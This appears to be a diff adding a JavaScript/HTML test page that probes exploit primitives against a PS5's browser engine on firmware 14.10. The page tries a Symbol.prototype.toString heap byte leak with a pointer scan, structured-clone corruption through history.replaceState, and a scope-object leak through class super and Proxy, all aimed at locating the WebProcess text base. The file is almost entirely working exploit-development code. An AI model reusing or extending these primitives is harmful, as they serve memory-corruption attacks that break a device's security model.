@@ -1,0 +1,363 @@
+<!--
+  p642: Test Relapse exploit primitives on PS5 14.10
+
+  CRASH_CLASS: MODERATE — structured clone corruption may crash
+
+  Tests three independent primitives from ntfargo/Relapse-Exploit:
+  A) Symbol.prototype.toString heap byte leak
+  B) history.replaceState structured clone corruption (duplicate refs)
+  C) Scope object leak via class super + Proxy
+
+  If ANY of these work on 14.10, we have a path to WebProcess text base.
+-->
+<!DOCTYPE html><html><head><meta charset="utf-8"><title>p642</title></head>
+<body>p642: Relapse primitives test
+<pre id="log" style="color:#0f0;background:#000;font:12px monospace;padding:8px;white-space:pre-wrap"></pre>
+<script>
+var L = document.getElementById('log');
+var bQ = [];
+function emit(tag, msg) {
+  var s = tag + ' ' + (msg || '');
+  L.textContent += s + '\n';
+  bQ.push(s);
+  if (bQ.length >= 3) flush();
+}
+function flush() {
+  if (!bQ.length) return;
+  var b = bQ.splice(0, 6);
+  for (var i = 0; i < b.length; i++) {
+    try {
+      var x = new XMLHttpRequest();
+      x.open('GET', '/beacon/P642-' + encodeURIComponent(b[i]), false);
+      x.send();
+    } catch(e) {}
+  }
+}
+window.onerror = function(m) { emit('ERR', String(m).slice(0,200)); flush(); };
+
+emit('START', 'v1');
+flush();
+
+// ================================================================
+// SECTION A: Symbol.prototype.toString heap byte leak
+//
+// Relapse creates a Symbol with many properties (512), 8 doubles, and a getter,
+// then calls symbolToString.call() which returns a very long string (924176 chars)
+// containing raw heap bytes readable via charCodeAt.
+// ================================================================
+try {
+  emit('A', 'symbol-toString test');
+
+  // Step 1: Basic symbol toString
+  var sym = Symbol('test');
+  var symStr = Symbol.prototype.toString.call(sym);
+  emit('A-BASIC', 'len=' + symStr.length + ' val=' + symStr.slice(0, 30));
+
+  // Step 2: Symbol with many properties (Relapse pattern)
+  var symObj = Object(Symbol('leak'));
+  for (var i = 0; i < 512; i++) {
+    symObj['p' + i] = i;
+  }
+  // Add doubles
+  for (var i = 0; i < 8; i++) {
+    symObj['d' + i] = 1.1 * (i + 1);
+  }
+  // Add getter
+  Object.defineProperty(symObj, 'g', {
+    get: function() { return 42; },
+    configurable: true
+  });
+
+  var symStr2 = Symbol.prototype.toString.call(symObj);
+  emit('A-RICH', 'len=' + symStr2.length + ' first30=' + symStr2.slice(0, 30));
+
+  if (symStr2.length > 1000) {
+    emit('A-LONG', '*** LONG STRING: ' + symStr2.length + ' chars ***');
+    // Scan for pointer-like values
+    var ptrCount = 0;
+    var samplePtrs = [];
+    for (var i = 0; i < Math.min(symStr2.length - 4, 100000); i += 4) {
+      var lo = symStr2.charCodeAt(i) | (symStr2.charCodeAt(i+1) << 16);
+      var hi = symStr2.charCodeAt(i+2) | (symStr2.charCodeAt(i+3) << 16);
+      // Check for pointer-like values (userland: 0x0000_0001_xxxx - 0x0000_7FFF_xxxx)
+      if (hi > 0 && hi < 0x8000 && lo !== 0) {
+        ptrCount++;
+        if (samplePtrs.length < 5) {
+          samplePtrs.push('0x' + hi.toString(16).padStart(4,'0') + lo.toString(16).padStart(8,'0'));
+        }
+      }
+    }
+    emit('A-PTRS', 'count=' + ptrCount + ' samples=' + samplePtrs.join(','));
+    if (ptrCount > 0) {
+      emit('A-LEAK', '*** HEAP BYTES LEAKED: ' + ptrCount + ' pointer-like values ***');
+    }
+  } else {
+    emit('A-SHORT', 'no oversized string (patched or wrong trigger)');
+  }
+
+  // Step 3: Try with a larger property count
+  var symObj3 = Object(Symbol('leak2'));
+  for (var i = 0; i < 2000; i++) {
+    symObj3['q' + i] = i * 1.5;
+  }
+  var symStr3 = Symbol.prototype.toString.call(symObj3);
+  emit('A-2K', 'len=' + symStr3.length);
+
+  // Step 4: Try with array-like indices
+  var symObj4 = Object(Symbol('leak3'));
+  for (var i = 0; i < 1000; i++) {
+    symObj4[i] = i;
+  }
+  var symStr4 = Symbol.prototype.toString.call(symObj4);
+  emit('A-IDX', 'len=' + symStr4.length);
+
+} catch(e) {
+  emit('A-ERR', e.name + ': ' + e.message);
+}
+flush();
+
+// ================================================================
+// SECTION B: Structured clone corruption via history.replaceState
+//
+// Relapse builds outerGraph[1] = outerGraph[2] = sameObject, serializes
+// via replaceState, then deserializes via history.state. If the object pool
+// mismatch is present, clone[1] !== clone[2] despite being the same reference.
+// ================================================================
+try {
+  emit('B', 'structured-clone test');
+
+  // Step 1: Basic replaceState/state roundtrip
+  var testObj = {marker: 'hello'};
+  var testGraph = [testObj, testObj];
+  history.replaceState(testGraph, '');
+  var clone1 = history.state;
+  emit('B-BASIC', 'len=' + clone1.length + ' eq=' + (clone1[0] === clone1[1]) +
+       ' m0=' + clone1[0].marker + ' m1=' + clone1[1].marker);
+
+  // Step 2: Relapse-style graph (0xffff+1 elements, duplicate at [1] and [2])
+  var referenceTarget = {type: 'target', val: 42};
+  var outerGraph = new Array(0x10001); // 65537 elements (smaller than Relapse's 0xffff+1 for safety)
+
+  // Filler at [0]
+  var filler = new Array(0x100);
+  for (var i = 0; i < 50; i++) filler[i] = BigInt(i);
+  for (var i = 50; i < 0x100; i++) filler[i] = {};
+  outerGraph[0] = filler;
+
+  // Duplicate reference
+  outerGraph[1] = referenceTarget;
+  outerGraph[2] = referenceTarget;
+  outerGraph[0x10000] = -64000;
+
+  emit('B-GRAPH', 'built len=' + outerGraph.length);
+  flush();
+
+  history.replaceState(outerGraph, '');
+  emit('B-STORED', 'replaceState done');
+  flush();
+
+  var clone2 = history.state;
+  if (!clone2) {
+    emit('B-NULL', 'history.state returned null');
+  } else {
+    var eq = (clone2[1] === clone2[2]);
+    var type1 = typeof clone2[1];
+    var type2 = typeof clone2[2];
+    emit('B-CLONE', 'len=' + clone2.length + ' eq=' + eq +
+         ' type1=' + type1 + ' type2=' + type2);
+
+    if (!eq) {
+      emit('B-MISMATCH', '*** CLONE CORRUPTION: [1] !== [2] ***');
+      emit('B-T1', 'constructor=' + (clone2[1] && clone2[1].constructor ? clone2[1].constructor.name : 'null'));
+      emit('B-T2', 'constructor=' + (clone2[2] && clone2[2].constructor ? clone2[2].constructor.name : 'null'));
+
+      // Check if clone[2] is a TypedArray
+      if (clone2[2] instanceof Uint8Array) {
+        emit('B-TYPEDARRAY', '*** clone[2] IS Uint8Array len=' + clone2[2].length + ' ***');
+      } else if (clone2[2] instanceof ArrayBuffer) {
+        emit('B-AB', '*** clone[2] IS ArrayBuffer size=' + clone2[2].byteLength + ' ***');
+      }
+    } else {
+      emit('B-SAME', 'clone[1] === clone[2] (no corruption, pool intact)');
+
+      // Verify the objects are proper clones
+      if (clone2[1] && clone2[1].type === 'target') {
+        emit('B-OK', 'proper clone: type=' + clone2[1].type + ' val=' + clone2[1].val);
+      }
+    }
+  }
+
+  // Step 3: Try multiple attempts (Relapse retries until corruption)
+  var corrupted = false;
+  for (var attempt = 0; attempt < 10 && !corrupted; attempt++) {
+    var rt = {a: attempt};
+    var og = new Array(0x10001);
+    var fl = [];
+    // Vary filler BigInt count (Relapse cycles through [2,4,6,7])
+    var bigIntCount = [2, 4, 6, 7][attempt % 4];
+    for (var i = 0; i < bigIntCount; i++) fl.push(BigInt(i * 3));
+    for (var i = bigIntCount; i < 100; i++) fl.push({});
+    og[0] = fl;
+    og[1] = rt;
+    og[2] = rt;
+    og[0x10000] = -64000;
+
+    history.replaceState(og, '');
+    var cl = history.state;
+    if (cl && cl[1] !== cl[2]) {
+      corrupted = true;
+      emit('B-HIT', '*** CORRUPTION at attempt ' + attempt + ' bigInts=' + bigIntCount + ' ***');
+      emit('B-HIT-T', 'type1=' + typeof cl[1] + ' type2=' + typeof cl[2]);
+      if (cl[2] instanceof Uint8Array) {
+        emit('B-HIT-UA', '*** Uint8Array! len=' + cl[2].length + ' ***');
+      }
+    }
+  }
+  if (!corrupted) {
+    emit('B-CLEAN', '0/10 attempts corrupted');
+  }
+
+} catch(e) {
+  emit('B-ERR', e.name + ': ' + e.message);
+}
+flush();
+
+// ================================================================
+// SECTION C: Scope object leak via class super + Proxy
+//
+// Relapse uses: class Leaker extends ParentClass { leak() { return super.foo; } }
+// with Proxy as prototype → returns the scope object
+// ================================================================
+try {
+  emit('C', 'scope-leak test');
+
+  // Step 1: Basic class + super behavior
+  function Parent() {}
+  Parent.prototype.foo = 'parent_foo';
+
+  class Child extends Parent {
+    leak() { return super.foo; }
+  }
+
+  var c = new Child();
+  emit('C-BASIC', 'super.foo=' + c.leak()); // Should be 'parent_foo'
+
+  // Step 2: Proxy as prototype
+  var proxyHandler = {
+    get: function(target, prop, receiver) {
+      emit('C-PROXY-GET', 'prop=' + String(prop));
+      if (prop === 'foo') return receiver; // Return the receiver (scope object?)
+      return Reflect.get(target, prop, receiver);
+    }
+  };
+
+  var proxiedProto = new Proxy({}, proxyHandler);
+
+  class Leaker {
+    leak() {
+      return super.foo;
+    }
+  }
+
+  // Set Leaker's prototype's prototype to the proxy
+  Object.setPrototypeOf(Leaker.prototype, proxiedProto);
+
+  var leaker = new Leaker();
+  var leaked = leaker.leak();
+  var leakedType = typeof leaked;
+
+  emit('C-LEAK', 'type=' + leakedType);
+
+  if (leakedType === 'object' && leaked !== leaker && leaked !== proxiedProto) {
+    emit('C-SCOPE', '*** SCOPE OBJECT LEAKED: ' + Object.keys(leaked).join(',') + ' ***');
+    // Try to extract addresses from scope
+    var props = Object.getOwnPropertyNames(leaked);
+    emit('C-PROPS', 'count=' + props.length + ' names=' + props.slice(0, 10).join(','));
+  } else if (leaked === leaker) {
+    emit('C-SELF', 'returned this (not scope)');
+  } else {
+    emit('C-OTHER', 'val=' + String(leaked).slice(0, 50));
+  }
+
+  // Step 3: More elaborate Leaker pattern from Relapse
+  // Relapse creates getterCarrier with 9M indexed slots
+  // and fakeHost/targetHolder at specific indices
+  // But let's first test if the basic scope leak works
+  try {
+    var scopeLeaker = (function() {
+      class SL {
+        constructor() {}
+        doLeak() {
+          return super.constructor;
+        }
+      }
+      var handler = {
+        get: function(t, p, r) {
+          return r;
+        }
+      };
+      Object.setPrototypeOf(SL.prototype, new Proxy({}, handler));
+      return new SL();
+    })();
+    var scopeResult = scopeLeaker.doLeak();
+    emit('C-SCOPE2', 'type=' + typeof scopeResult +
+         ' isThis=' + (scopeResult === scopeLeaker));
+    if (typeof scopeResult === 'object' && scopeResult !== scopeLeaker) {
+      emit('C-SCOPE2-KEYS', Object.getOwnPropertyNames(scopeResult).join(','));
+    }
+  } catch(e) {
+    emit('C-SCOPE2-ERR', e.name + ': ' + e.message);
+  }
+
+} catch(e) {
+  emit('C-ERR', e.name + ': ' + e.message);
+}
+flush();
+
+// ================================================================
+// SECTION D: history.pushState large graph stress test
+// Test if serialization of complex graphs crashes or produces anomalies
+// ================================================================
+try {
+  emit('D', 'pushState stress');
+
+  // Test with SharedArrayBuffer-like references
+  var shared = {shared: true, data: new Array(100).fill(0)};
+  var graph = [];
+  for (var i = 0; i < 1000; i++) {
+    graph.push(shared); // 1000 refs to same object
+  }
+  history.replaceState(graph, '');
+  var clone = history.state;
+  var allSame = true;
+  for (var i = 1; i < clone.length; i++) {
+    if (clone[i] !== clone[0]) { allSame = false; break; }
+  }
+  emit('D-1K', 'len=' + clone.length + ' allSame=' + allSame);
+
+  // Nested duplicate refs
+  var inner = {val: 99};
+  var nested = {a: inner, b: inner, c: [inner, inner, inner]};
+  history.replaceState(nested, '');
+  var nc = history.state;
+  emit('D-NEST', 'a===b:' + (nc.a === nc.b) + ' c0===a:' + (nc.c[0] === nc.a));
+
+  // Circular reference attempt
+  try {
+    var circ = {};
+    circ.self = circ;
+    history.replaceState(circ, '');
+    var cc = history.state;
+    emit('D-CIRC', 'survived self===self:' + (cc.self === cc));
+  } catch(e) {
+    emit('D-CIRC', 'error: ' + e.name);
+  }
+
+} catch(e) {
+  emit('D-ERR', e.name + ': ' + e.message);
+}
+flush();
+
+emit('DONE', 'v1');
+flush();
+</script></body></html>
